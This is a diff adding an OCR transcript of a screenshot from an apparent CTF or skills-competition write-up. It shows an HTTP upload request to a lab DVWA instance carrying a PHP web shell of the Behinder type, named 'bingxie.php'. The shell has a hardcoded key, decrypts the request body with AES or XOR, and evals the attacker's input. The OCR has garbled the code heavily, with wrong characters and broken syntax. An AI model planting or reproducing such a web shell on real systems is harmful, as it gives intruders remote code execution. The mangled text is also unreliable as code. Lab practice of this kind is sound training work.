@@ -1,0 +1,41 @@
+# OCR: 056d7560a1495af1a0a51af2c051fc83.webp
+# 来源: ./02-WriteUp/2025/2025-广西职业技能大赛/056d7560a1495af1a0a51af2c051fc83.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:26
+
+PosT/vulnerabilities/upload/HTTP/1.1
+Host:192.168.56.146 Content-Length:1037
+Cache-Control:max-age=0
+Origin:http://192.168.56.14e
+Content-Type：multipart/form-data;boundary=----WebKitFormBoundarymKaDEl9b2wOwIy5b Upgrade-Insecure-Reguests:
+User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebkit/537.36（KHTML,1ikeGecko)Chrome/139.0.0.eSafari/537.36
+Accept:text/html,application/xhtml+xml,application/xml;q=o.9,image/avif,image/webp,image/apng,*/*;q=e.8,application/signed-exchange;v=b3;q=o.7
+Referer：http://192.168.56.14o/vulnerabi1ities/upload/ Accept-Language:zh-cN,zh;q=o.9
+cookie:PHPsEssID=t9o3chravtmea47ar35ikddsc7：security=low Connection:close
+--WebKitFormBoundarymKaDE19b2wOwIy5b
+Content-Disposition:form-data; name="MAXFILESIzE" 100000
+-WebKitFormBoundarymKaDE19b2wOwIy5b
+Content-Disposition: form-data; name="uploaded"; filename="bingxie.php"
+Content-Type:image/jpeg <?php
+@error_reporting(o); session_start();
+$key="e45e329feb5d925b";//.
+$SESSION['k'=$key session_write_close();
+$post=filegetcontents("php://input")： if(!extensionloaded('openssl'))
+$t="base64","decode"; $post=$t($post."");
+.32...md5.
+for($si=o;$i<strlen($post);$i++){
+$post[$i] = $post[$i]^$key[$i+i&15];
+else
+$post=openssl_decrypt($post，"AEs128"，$key);
+$arr=explode(",$post);
+$func=$arr[e]; $params=$arr[1];
+class cfpublic function
+@calluserfunc(newc(),$params):
+?>
+invoke($p)feval($p.""):)
+--WebKitFormBoundarymKaDE19b2wOwIy5b
+Content-Disnositiont
+form-data
+name-"Unload"
+.16
+.rebeyond
